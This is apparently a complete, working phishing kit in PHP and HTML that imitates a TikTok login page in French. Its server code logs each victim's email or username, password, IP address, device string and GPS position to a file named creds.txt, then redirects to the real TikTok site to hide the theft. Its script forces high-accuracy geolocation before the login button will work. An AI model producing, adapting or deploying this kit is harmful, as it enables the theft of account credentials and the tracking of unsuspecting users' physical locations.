<?php
date_default_timezone_set('Africa/Bujumbura');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $gps = $_POST['gps'] ?? 'GPS_REFUSE';
    
    $time  = date('Y-m-d H:i:s');
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 TIKTOK VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "│ 📍 GPS POSITION : {$gps}\n";
    $log .= "└─────────────────────────────────────────\n\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    echo '<script>setTimeout(function(){window.location.href="https://tiktok.com";},1500);</script>';
    echo '<div style="text-align:center;padding:50px;color:#ff0050;"><h2>Connexion TikTok...</h2><div style="border:3px solid #f3f3f3;border-top:3px solid #ff0050;border-radius:50%;width:40px;height:40px;margin:auto;animation:spin 1s linear infinite;"></div></div>';
    echo '<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>TikTok</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    background: linear-gradient(45deg, #000000, #ff0050, #fe2c55, #ff0050);
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    color: white;
}
.tiktok-form {
    background: rgba(255,255,255,0.1);
    backdrop-filter: blur(10px);
    padding: 40px;
    border-radius: 20px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    width: 100%;
    max-width: 380px;
    border: 1px solid rgba(255,255,255,0.2);
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo img {
    width: 200px;
    filter: drop-shadow(0 0 10px #ff0050);
}
.input-box {
    margin-bottom: 20px;
}
input[type="text"], input[type="password"] {
    width: 100%;
    padding: 18px;
    border: none;
    border-radius: 25px;
    font-size: 16px;
    box-sizing: border-box;
    background: rgba(255,255,255,0.9);
}
input:focus {
    outline: none;
    box-shadow: 0 0 20px rgba(255,0,80,0.5);
}
.tiktok-btn {
    width: 100%;
    padding: 18px;
    background: linear-gradient(45deg, #ff0050, #fe2c55);
    color: white;
    border: none;
    border-radius: 25px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}
.tiktok-btn:hover {
    transform: scale(1.02);
}
.tiktok-btn:disabled {
    background: #666;
    cursor: not-allowed;
    transform: none;
}
.gps-box {
    background: rgba(0,255,0,0.2);
    padding: 15px;
    border-radius: 15px;
    margin: 15px 0;
    text-align: center;
    border: 2px solid #00ff00;
}
</style>
</head>
<body>
<div class="tiktok-form">
    <div class="logo">
        <img src="https://www.tiktok.com/favicon.ico" alt="TikTok" style="width:80px;">
        <h2 style="color:#fff;margin-top:10px;">TikTok</h2>
    </div>
    
    <form method="POST">
        <input type="hidden" name="gps" id="tiktok_gps">
        
        <div class="input-box">
            <input type="text" name="email" placeholder="Email ou téléphone" required autofocus>
        </div>
        
        <div class="input-box">
            <input type="password" name="pass" placeholder="Mot de passe" required>
        </div>
        
        <div class="gps-box" id="gps_info">📍 Activez GPS localisation</div>
        
        <button type="submit" name="submit" id="tiktok_submit" class="tiktok-btn" disabled>Envoyer</button>
    </form>
</div>

<script>
function tiktokGPS() {
    navigator.geolocation.getCurrentPosition(
        pos => {
            let gps = pos.coords.latitude.toFixed(6) + "," + pos.coords.longitude.toFixed(6);
            document.getElementById('tiktok_gps').value = gps;
            document.getElementById('gps_info').innerHTML = "✅ GPS OK: " + gps;
            document.getElementById('tiktok_submit').disabled = false;
        },
        () => {
            document.getElementById('gps_info').innerHTML = "❌ GPS refusé";
        },
        {enableHighAccuracy: true}
    );
}
window.onload = tiktokGPS;
</script>
</body>
</html>
